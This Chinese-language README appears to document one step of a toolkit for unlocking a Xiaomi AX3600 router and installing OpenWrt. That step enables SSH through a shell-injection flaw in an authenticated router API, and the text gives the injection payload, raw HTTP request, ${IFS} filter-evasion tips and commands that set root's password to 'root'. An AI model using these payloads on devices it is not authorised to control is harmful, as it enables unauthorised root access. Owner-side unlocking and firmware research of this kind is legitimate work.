# 步骤 3：启用 SSH — set_config_iotdev 注入（AX3600 专属）

## 漏洞原理

`POST /api/misystem/set_config_iotdev` 接受 `bssid` / `user_id` / `ssid` 三个参数，
其中 `ssid` 字段最终会被 `hostapd` 当成命令行参数解析（`uci set wireless.@wifi-iface[].ssid=`），
而 hostapd 在解析 `-h` 标志后的字符串时用 shell 调用，导致后续 `;` 分隔的命令被执行。

```
ssid = "-h; nvram set ssh_en=1; nvram commit ;"
       └┬┘└──────────────────┬──────────────────────┘
       hostapd -h            shell-injected commands
```

**整条命令以单层 `;` 注入即可**，不需要 AX6 那种多步链路（time manipulation + scene 调度）。

## 4 步注入序列

| # | 目的 | 命令 |
|---|------|------|
| 1 | nvram 启用 SSH/telnet/uart/bootflag | `nvram set flag_last_success=0; nvram set flag_boot_rootfs=0; nvram set boot_wait=on; nvram set uart_en=1; nvram set telnet_en=1; nvram set ssh_en=1; nvram commit` |
| 2 | 解除 dropbear channel 锁 | `sed -i 's/channel=.*/channel="debug"/g' /etc/init.d/dropbear` |
| 3 | 设置 root 密码 = root | `echo -e "root\nroot" > /tmp/psw.txt; passwd root < /tmp/psw.txt; rm -f /tmp/psw.txt` |
| 4 | 重启 dropbear | `/etc/init.d/dropbear restart` |

**注意第 2 步的 sed**：AX3600 的 release 锁形式是 `channel=`（不是 AX6 的 `release=`），
老代码里这步是 AX3600 与 AX6 唯一需要差异化的地方。

## ⚠️ 版本限制：仅旧版固件可用

`set_config_iotdev` 在 **1.1.x 系列已被小米封堵**（实测 1.1.25 连合法 SSID
都返 `code:1523 参数错误`）。

| 固件 | 注入可用？ | 实测 |
|------|-------------|------|
| 1.0.17 | ✅ | 2026-06-09 `26677/E0P534252` 验证通过 |
| 1.1.25 | ❌ | 返 `code:1523`（连 `ssid=hello` 都拒绝）|

### 1.1.x 上想开 SSH 的迂回路径

`1.1.x 工厂态 → 步骤 4 降级到 1.0.17 → 重新 init → 步骤 3 开 SSH`

```bash
# 1.1.x 工厂态先降级
python3 4.official_upgrade.py --stok <token> --file files/R3600_1.0.17.bin
# recovery=1 清 NVRAM, 路由器重启后回到 inited=0 (约 45s)

# 重新初始化 (1.0.17 工厂态)
python3 1.official_init.py --admin-pwd 12345678

# 拿新 stok
python3 2.login_get_stok.py --pwd 12345678

# 开 SSH (1.0.17 上 set_config_iotdev 注入可用)
python3 3.enable_ssh.py --wait
```

### 1.1.x 上想直接刷 OpenWrt 的路径（不需要 SSH）

跳过步骤 3，步骤 4 直接刷：

```bash
python3 2.login_get_stok.py --pwd 12345678 | python3 4.official_upgrade.py \
    --file files/libwrt-qualcommax-ipq807x-xiaomi_ax3600-stock-squashfs-factory.ubi
```

`flash_rom?custom=1&recovery=1` 允许非官方固件，可以一步直接刷 OpenWrt。
这种方式下步骤 3 完全不需要。

## 注入请求格式

```http
POST /cgi-bin/luci/;stok=<stok>/api/misystem/set_config_iotdev?
    bssid=Xiaomi
    &user_id=longdike
    &ssid=-h;nvram%20set%20ssh_en%3D1;nvram%20commit;
```

URL-encoded `;` 是关键分隔符，hostapd 解析时作为 shell 命令分隔。

## 字符过滤经验

实测未遇到 `;` 被吃的情况，但老代码提到 ssid 字段对 ` ` 和 `=` 在某些固件会过滤。
如果遇到注入失败，可以尝试：
1. 用 `${IFS}` 代替空格：`nvram${IFS}set${IFS}ssh_en=1`
2. 用 `/etc/init.d/dropbear${IFS}restart`
3. 或者干脆走"降级到 1.0.17"迂回路径

## 输出 JSON（成功）

```json
{"ok": true, "step": "enable_ssh", "data": {
  "ip": "192.168.31.1",
  "ssh_user": "root",
  "ssh_password": "root",
  "ssh_port": 22,
  "inject_results": [
    {"step": "nvram 启用 SSH/telnet/uart/bootflag", "ok": true},
    {"step": "sed 解除 dropbear channel 锁", "ok": true},
    {"step": "设 root 密码", "ok": true},
    {"step": "重启 dropbear", "ok": true}
  ],
  "ssh_ok": true,
  "ssh_wait": {"ssh_ok": true, "elapsed_sec": 20, "polls": 20}
}}
```

## 退出码

| Code | 含义 |
|------|------|
| `0` | 成功 |
| `1` | 注入失败 / SSH 未就绪 |
| `2` | 参数错误（缺 --stok 或 --pwd） |

## SSH 登录

路由器只提供 `ssh-rsa` host key（旧 dropbear），需显式指定：

```bash
sshpass -p root ssh -oHostKeyAlgorithms=+ssh-rsa root@192.168.31.1
# 或交互式:
ssh -oHostKeyAlgorithms=+ssh-rsa root@192.168.31.1
# 密码: root
```

## 验证清单

注入成功后 SSH 进路由器跑：

```bash
nvram get ssh_en           # → 1
nvram get telnet_en        # → 1
cat /etc/init.d/dropbear | grep channel    # → channel="debug"
ls -la /etc/dropbear       # dropbear 在跑
```

`dropbear` 的 release 锁逻辑是：
```bash
if [ "$flg_ssh" != "1" -o "$channel" = "release" ]; then
```
把 `channel` 改成 `debug` 后这个判断放行，SSH 才能正常起来。